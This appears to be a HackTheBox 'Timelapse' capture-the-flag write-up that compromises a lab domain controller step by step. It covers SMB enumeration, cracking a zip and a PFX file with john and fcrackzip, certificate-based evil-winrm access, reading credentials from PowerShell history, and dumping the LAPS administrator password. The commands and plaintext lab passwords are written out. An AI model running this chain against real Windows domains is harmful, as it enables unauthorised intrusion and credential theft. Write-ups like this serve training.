# Recon

As usual we start with a port scan against the target:
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.11.152 -T5
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/1.png">

From the looks of it we can tell it's a domain controller. Lot's of open ports to investigate.

# Enumeration
Normally a domain controller has great enumeration potential. We can use tools like ```smbclient, enum4linux, smbmap, nbtscan, rpcclient``` and there are numerous ```impacket``` scripts available.

Using ```rpcclient``` we see what privileges the current users has.
```
rpcclient -U '' -N 10.10.11.152
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/5.png">

Unfortunately ```enumdomusers``` is not allowed. At this point is just trial and error running different commands. Let's leave it for now.

After doing some more enumeration we find a share at ```Shares``` containing some files. 
```
smbclient -N -L //10.10.11.152/
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/2.png">



# Initial Foothold
Extracting the zipfile requires a password. We can use ```7z``` to get more information on the zipfile and it's encryption.

```
7z l -slt winrm_backup.zip
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/3.png">


We can try to crack the password using ```john``` or ```fcrackzip```. In this case i chose the latter.

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/4.png">


We have cracked the password and can now extract ```legacyy_dev_auth.pfx```.

A PFX file indicates a certificate in PKCS#12 format; it contains the certificate, the intermediate authority certificate necessary for the trustworthiness of the certificate, and the private key to the certificate. Think of it as an archive that stores everything you need to deploy a certificate.

I had to update ```john``` in order to have ```pfx2john``` available and run the following command to create a suitable hash for ```john```.

```
pfx2john legacy_dev_auth.pfx > hash
```

And pass it along to john:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash    
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/6.png">

We have cracked the password using the rockyou wordlist. I found [documentation](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) how one could extract the private key and certificate from a pfx file.

Extract the private key:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key -nodes  
``` 

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/7.png">

And we do the same to extract the certificate:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt 
```

After this we alter the files by removing the header so we are only left with the key itself. We can now continue by using the keys to connect to the target with ```evil-winrm``` .

```
evil-winrm -S -k legacy.key -c legacy.crt -i 10.10.11.152
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Timelapse/assets/8.png">

# Lateral Movement
We are unable to use ```winPEAS``` because Microsoft Defender is blocking the file. Using an obfuscated version didn't help either. After further enumerating the host for the usual ways for privilege escalation i was unable to find anything useful. I got some help pointing me in the right direction and found the Powershell history file:

pic9

We found the password for the ```svc_deploy``` account and can use this to run commands as the this user.

```
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)

invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

And we can check for privileges:
```
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /priv}

invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
```

pic10


# Privilege Escalation
We see that this user is member of the ```LAPS_Readers``` group which is useful to us because we can probably extract the local administrator password. We can check for this by using the ```AD-Module```.

```
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
```

pic11

Now that we've found the password we can again use ```evil-winrm``` to connect to the target as ```administrator```.

```
evil-winrm -i 10.10.11.152 -u administrator -p '6yHTPR#s417Lo6/7kC{aP!WC' 
```






